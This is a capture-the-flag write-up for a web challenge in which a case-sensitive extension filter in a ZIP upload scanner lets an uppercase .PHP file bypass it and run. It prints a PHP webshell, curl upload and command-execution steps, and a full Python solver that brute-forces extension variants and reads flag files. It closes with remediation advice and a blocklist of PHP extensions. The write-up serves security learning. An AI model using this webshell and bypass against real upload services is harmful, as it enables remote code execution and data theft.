---
title: "Zip A Dip Doo Dah"
summary: "UMCS Preliminary umcs preliminary, web, reverse engineering writeup covering Zip A Dip Doo Dah with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - web
  - reverse-engineering
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** Zip-a-Dip-Doo-Dah
**Category:** Web
**Points:** 360
**Flag Format:** `UMCS{}`
**Target URL:** `http://d451a33c-e997-4313-bb64-07d73fc08d6c.chal.umcybersec.site:8001/`

The challenge provides a web application called **Zippy Scanner Enterprise**. The application accepts uploaded `.zip` archives, scans the files inside the archive, and extracts allowed files into a public upload directory.

The goal is to bypass the upload scanner, get a server-side executable file extracted, execute commands through it, and recover the flag.

The given hint was:

```text
abc != ABC
```

This hint strongly suggests a **case-sensitivity issue**.

---

# Initial Analysis

Accessing the challenge root page returns a simple ZIP upload form:

```html
<form action="" method="POST" enctype="multipart/form-data">
    <input type="file" name="zipfile" accept=".zip" required>
    <button type="submit" class="btn">Upload & Extract</button>
</form>
```

The service behavior is:

1. User uploads a ZIP archive.

2. The backend scans each file inside the ZIP.

3. Some files are blocked.

4. Allowed files are extracted.

5. Extracted files are linked under `/uploads/<random_directory>/filename`.


A first test was performed using a PHP file named:

```text
g10d.pHp
```

The server responded with:

```html
Blocked file type  -> g10d.pHp
```

This confirmed that the application was checking file extensions and blocking some PHP-like filenames. The manual test also showed that the blocked file was not extracted, because requests to common paths such as `/uploads/g10d.pHp` returned `404 Not Found`.

However, the hint `abc != ABC` suggested that not all case variations were handled equally. Therefore, the next step was to test multiple case variants of the `.php` extension.

---

# Vulnerability / Weakness Identification

The vulnerability is an **inconsistent case-sensitive file extension filter**.

The application attempted to block dangerous PHP files, but it did not normalize filenames before validating them. As a result, it treated the following extensions differently:

```text
.php
.pHp
.PhP
.PHP
```

A secure scanner should convert the extension to lowercase before checking it. For example:

```php
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
```

Instead, the challenge scanner behaved inconsistently. It blocked one mixed-case extension:

```text
g10d.pHp
```

but allowed another variant:

```text
g10d.PHP
```

The second part of the vulnerability is that the extracted file was placed inside a web-accessible directory:

```text
/uploads/<random_directory>/g10d.PHP
```

The server then executed the `.PHP` file as PHP code. This created a full command execution path:

```text
ZIP upload → extension filter bypass → PHP file extraction → webshell execution → flag read
```

---

# Exploitation Strategy

The exploitation strategy was:

1. Create a PHP webshell.

2. Store it inside a ZIP archive using several filename case variants.

3. Upload the ZIP archive to the challenge.

4. Parse the server response for extracted file links.

5. Identify which PHP variant was accepted.

6. Send a command to the extracted PHP file using the `cmd` query parameter.

7. Use the shell to read the flag from the filesystem.


The PHP payload used was:

```php
<?PHP
echo "G10D_OK\n";
system($_GET["cmd"] ?? "id");
?>
```

Important details:

- `<?PHP` works as a PHP opening tag.

- `system()` executes an operating system command.

- `$_GET["cmd"]` allows commands to be passed through the URL.

- `G10D_OK` is a marker used by the solver to confirm that the webshell executed.


Example command execution URL:

```text
/uploads/<random>/g10d.PHP?cmd=id
```

If the file executes successfully, the response should contain something like:

```text
G10D_OK
uid=...
```

After confirming command execution, the solver reads the flag using:

```bash
cat /flag.txt
```

with fallbacks for common CTF flag locations.

---

# Proof of Concept

A minimal manual payload can be created like this:

```bash
cat > g10d.PHP <<'EOF'
<?PHP
echo "G10D_OK\n";
system($_GET["cmd"] ?? "id");
?>
EOF

zip payload.zip g10d.PHP
```

Upload it:

```bash
BASE="http://d451a33c-e997-4313-bb64-07d73fc08d6c.chal.umcybersec.site:8001"

curl -s -F "zipfile=@payload.zip" "$BASE/" | tee response.html
```

The successful server response contains a link similar to:

```html
<a href="/uploads/1c9e780b51fa1ae4/g10d.PHP" target="_blank">g10d.PHP</a>
```

Then trigger command execution:

```bash
curl "$BASE/uploads/1c9e780b51fa1ae4/g10d.PHP?cmd=id"
```

Expected result:

```text
G10D_OK
uid=...
```

Finally, read the flag:

```bash
curl "$BASE/uploads/1c9e780b51fa1ae4/g10d.PHP?cmd=cat%20/flag.txt"
```

Recovered flag:

```text
UMCS{2dfbf11f-d1d2-4563-a4b3-c7a3af972ff9}
```

---

# Full Python Solver

```python
#!/usr/bin/env python3
"""
Solver for Zip-a-Dip-Doo-Dah

This script exploits a case-sensitive ZIP file extension filter bypass.
It uploads a ZIP archive containing PHP webshells with different extension
case variants, finds the extracted executable shell, and reads the flag.

Usage:
    python3 solve_zipadip.py http://target:port
"""

import io
import re
import sys
import zipfile
import urllib.parse
import requests


def build_zip_payload() -> bytes:
    """
    Create an in-memory ZIP file containing several PHP filename variants.
    The goal is to bypass a case-sensitive extension blacklist.
    """

    php_payload = b'''<?PHP
echo "G10D_OK\\n";
system($_GET["cmd"] ?? "id");
?>'''

    filenames = [
        "g10d.php",
        "g10d.pHp",
        "g10d.PhP",
        "g10d.PHP",
        "g10d.Phtml",
        "g10d.PHTML",
    ]

    buffer = io.BytesIO()

    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for name in filenames:
            zf.writestr(name, php_payload)

    return buffer.getvalue()


def upload_payload(base_url: str, zip_data: bytes) -> str:
    """
    Upload the generated ZIP file to the target.
    Returns the HTML response body.
    """

    files = {
        "zipfile": ("payload.zip", zip_data, "application/zip")
    }

    response = requests.post(base_url + "/", files=files, timeout=10)
    response.raise_for_status()

    return response.text


def extract_candidate_urls(base_url: str, html: str) -> set[str]:
    """
    Extract possible shell URLs from the server response.
    The application usually returns links to successfully extracted files.
    """

    candidates = set()

    # Extract href/src links from HTML.
    links = re.findall(r'(?:href|src)=["\']([^"\']+)["\']', html, flags=re.IGNORECASE)

    for link in links:
        if "g10d" not in link.lower():
            continue

        if link.startswith("http://") or link.startswith("https://"):
            candidates.add(link)
        else:
            candidates.add(base_url + "/" + link.lstrip("/"))

    # Add fallback guesses in case the response does not expose links clearly.
    filenames = [
        "g10d.php",
        "g10d.pHp",
        "g10d.PhP",
        "g10d.PHP",
        "g10d.Phtml",
        "g10d.PHTML",
    ]

    common_dirs = [
        "",
        "uploads",
        "upload",
        "files",
        "extracted",
        "extract",
        "static",
        "static/uploads",
    ]

    for directory in common_dirs:
        for filename in filenames:
            if directory:
                candidates.add(f"{base_url}/{directory}/{filename}")
            else:
                candidates.add(f"{base_url}/{filename}")

    return candidates


def test_shell(url: str) -> bool:
    """
    Test whether a candidate URL is an active PHP webshell.
    """

    try:
        response = requests.get(url, params={"cmd": "id"}, timeout=6)
    except requests.RequestException:
        return False

    body = response.text

    return "G10D_OK" in body or "uid=" in body


def run_command(shell_url: str, command: str) -> str:
    """
    Execute a command through the PHP shell.
    """

    response = requests.get(shell_url, params={"cmd": command}, timeout=10)
    response.raise_for_status()
    return response.text


def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://target:port")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/")

    print("[*] Building ZIP payload...")
    zip_data = build_zip_payload()

    print("[*] Uploading ZIP payload...")
    html = upload_payload(base_url, zip_data)

    print("[*] Server response preview:")
    print(html[:1500])

    print("[*] Extracting candidate shell URLs...")
    candidates = extract_candidate_urls(base_url, html)

    if not candidates:
        print("[-] No candidate URLs found.")
        sys.exit(1)

    print(f"[*] Testing {len(candidates)} candidate URLs...")

    shell_url = None

    for url in sorted(candidates):
        if test_shell(url):
            shell_url = url
            print(f"[+] Working shell found: {shell_url}")
            break

    if shell_url is None:
        print("[-] No working shell found.")
        print("[-] Check the upload response manually for the extracted file path.")
        sys.exit(1)

    print("[*] Reading flag...")

    # Try common CTF flag locations.
    flag_command = (
        "cat /flag.txt 2>/dev/null || "
        "cat /app/flag.txt 2>/dev/null || "
        "cat /var/www/html/flag.txt 2>/dev/null || "
        "find / -iname '*flag*' -type f -maxdepth 4 -exec cat {} \\; 2>/dev/null"
    )

    output = run_command(shell_url, flag_command)

    print("[*] Command output:")
    print(output)

    match = re.search(r"UMCS\{[^}]+\}", output)

    if match:
        print(f"[+] FLAG: {match.group(0)}")
    else:
        print("[-] Flag pattern was not found in the output.")
        print("[-] Inspect the command output manually.")


if __name__ == "__main__":
    main()
```

---

# Walkthrough

First, save the solver:

```bash
nano solve_zipadip.py
```

Paste the Python script, then install the required dependency if needed:

```bash
pip3 install requests
```

Run the solver against the challenge instance:

```bash
python3 solve_zipadip.py http://d451a33c-e997-4313-bb64-07d73fc08d6c.chal.umcybersec.site:8001
```

Expected output flow:

```text
[*] Building ZIP payload...
[*] Uploading ZIP payload...
[*] Server response preview:
...
[*] Extracting candidate shell URLs...
[*] Testing candidate URLs...
[+] Working shell found: http://.../uploads/<random>/g10d.PHP
[*] Reading flag...
[*] Command output:
G10D_OK
UMCS{...}
[+] FLAG: UMCS{...}
```

In the successful run, the working shell was found at:

```text
/uploads/1c9e780b51fa1ae4/g10d.PHP
```

The solver confirmed execution and recovered the flag:

```text
G10D_OK
UMCS{2dfbf11f-d1d2-4563-a4b3-c7a3af972ff9}
```

Troubleshooting notes:

- If one filename variant is blocked, that is expected. The exploit relies on trying several case variants.

- If the shell is not found, check the HTML response for the extracted file path.

- The `/uploads/<random>/` directory changes per upload, so hardcoding the path is unreliable.

- If `requests` is missing, install it with `pip3 install requests`.

- If the instance restarts, rerun the script with the new challenge URL.


---

# Flag

The flag was recovered by executing a command through the extracted PHP file:

```bash
cat /flag.txt
```

Final flag:

```text
UMCS{2dfbf11f-d1d2-4563-a4b3-c7a3af972ff9}
```

---

# Conclusion

The root cause of the challenge was improper filename validation during ZIP extraction. The application attempted to block PHP files, but the filter was case-sensitive and inconsistent. Because the filename extension was not normalized before validation, an uppercase `.PHP` extension bypassed the scanner.

The uploaded file was then extracted into a web-accessible directory where the server executed it as PHP. This turned a ZIP upload feature into remote command execution.

Key lesson:

```text
Always normalize file extensions before validation, never rely only on blacklist checks, and never allow uploaded files to execute as server-side code.
```

A proper fix would include:

```php
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

$blocked = ["php", "php3", "php4", "php5", "phtml", "phar"];

if (in_array($ext, $blocked, true)) {
    die("Blocked file type");
}
```

Additionally, uploaded and extracted files should be stored outside the webroot, or script execution should be disabled in the upload directory.
